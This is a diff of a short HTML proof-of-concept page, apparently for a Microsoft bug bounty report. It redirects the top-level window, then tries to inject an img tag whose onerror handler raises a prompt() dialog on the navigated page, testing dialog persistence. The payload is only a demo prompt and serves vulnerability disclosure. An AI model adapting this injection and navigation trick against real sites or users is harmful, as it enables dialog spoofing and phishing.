@@ -1,39 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <title>MSRC PoC Demo</title>
 </head>
 <body>
-<h1>MSRC PoC Demo - Safe</h1>
-<button id="trigger">Trigger Prompt</button>
+
+<h1>MSRC PoC Demo</h1>
+<button id="trigger">Trigger</button>
 
 <script>
-function showPrompt() {
+document.getElementById('trigger').onclick = () => {
 
-    // delay sebelum redirect
-    setTimeout(function () {
+  // delay sebelum top‑level navigation (user gesture preserved)
+  setTimeout(() => {
 
-        // top-level navigation ke domain kamu
-        const win = window.open('https://google.com:8080', '_top');
+    const win = window.open('https://google.com:8080', '_top');
 
-        // delay tambahan setelah page baru terbuka
-        setTimeout(function () {
-            try {
-                win.document.body.innerHTML = `
-                    <h2>Demo Page</h2>
-                    <img src="" onerror="prompt('💡 Demo: bug.bounty.ids dialog persistence','')">
-                `;
-            } catch (e) {
-                console.log('DOM access blocked (expected on some browsers)');
-            }
-        }, 100);
+    // small delay after navigation attempt
+    setTimeout(() => {
+      try {
+        win.document.body.innerHTML = `
+          <h2>Demo Page</h2>
+          <img src="" onerror="prompt('Demo: dialog persistence','')">
+        `;
+      } catch (e) {
+        // expected: cross‑origin blocked
+      }
+    }, 100);
 
-    }, 2000); // ⏱️ delay redirect (2 detik)
-}
-
-document.getElementById('trigger').addEventListener('click', function () {
-    showPrompt();
-});
+  }, 1000);
+};
 </script>
+
 </body>
 </html>
